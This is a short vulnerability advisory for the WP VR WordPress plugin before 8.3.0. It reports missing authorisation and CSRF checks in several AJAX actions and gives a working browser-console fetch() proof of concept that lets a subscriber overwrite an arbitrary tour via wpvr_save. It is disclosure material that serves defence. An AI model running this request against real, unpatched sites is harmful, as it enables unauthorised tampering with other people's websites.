## WordPress Plugin Vulnerabilities

# WP VR < 8.3.0 - Subscriber+ Arbitrary Tour Update

### Description

The plugin does not have authorisation and CSRF checks in various AJAX actions, one in particular could allow any authenticated users, such as subscriber to update arbitrary tours

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as a subscriber user (change the postid to an existing Tour ID)
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": 'action=wpvr\_save&postid=681&preview=https://raw.githubusercontent.com/wpscanteam/wpscan/gh-pages/images/wpscan\_logo.png&panodata={"scene-list":[{"scene-attachment-url":"https://raw.githubusercontent.com/wpscanteam/wpscan/gh-pages/images/wpscan\_logo.png","scene-id":"1","scene-type":"equirectangular"}]}',
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
This will update the tour with ID 681 with the given images
Other affected AJAX actions: wpvr\_preview, wpvrstreetview\_preview, wpvr\_file\_import, wpvr\_role\_management, wpvr\_notice
